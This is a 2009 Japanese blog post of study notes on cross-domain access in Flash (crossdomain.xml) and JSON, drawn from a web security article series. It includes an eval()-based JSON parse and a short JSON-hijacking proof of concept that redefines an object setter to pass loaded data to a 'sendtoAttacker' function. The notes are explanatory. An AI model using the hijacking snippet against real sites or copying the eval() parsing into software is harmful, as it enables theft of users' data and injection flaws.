---
layout: post
title: 'Flash，JSONでのクロスドメインアクセス勉強メモ'
date: 2009-11-24
wordpress_id: 320
permalink: /blog/memo-of-flash-json-cross-domain
comments: true
categories: [nil]
---
<div class="section">
<p>gihyoサイトの「ここが危ない！Web2.0のセキュリティ」連載の<a href="http://gihyo.jp/dev/serial/01/web20sec/0004" target="_blank">第4回：「Flash，JSONでのクロスドメインアクセス」の</a>勉強メモです。</p>
<h4>Flashのクロスドメインアクセス</h4>
<h5>動作原理</h5>
<p>データ提供側で認証のファイルを設置するだけです。</p>
<p>ファイル名は「crossdomain.xml」で、これが例なのかこう書かなければならないのかは明確に書いてません。</p>
```xml

<cross-domain-policy>
	<allow-access-from domain="www.securesky-tech.com" />
</cross-domain-policy>
{% endcodeblock %}
<h4>JSONでも実はクロスドメインアクセスが可能</h4>
<h5>動作原理</h5>
<p>eval()関数でデータを評価するだけで使用可能になる</p>
{% codeblock %}

var obj = eval("("+req.responseText+")");

{% endcodeblock %}
<h5>クロスドメインの実現</h5>
<p>setterメソッドをサポートしているブラウザ（FirefoxやSafari 3等）では，setterメソッドを再定義することによって，JSONもSCRIPTタグで呼び出して使うことが可能になる。</p>
<pre class="brush:html">
<html>
	<script>
		Object.prototype.__defineSetter__('name', function(x){sendtoAttacker(x);});
	</script>
	<script src="http://www.securesky-tech.com/object.dat">
	</script>
</html>

```
<p>　</p>
</div>
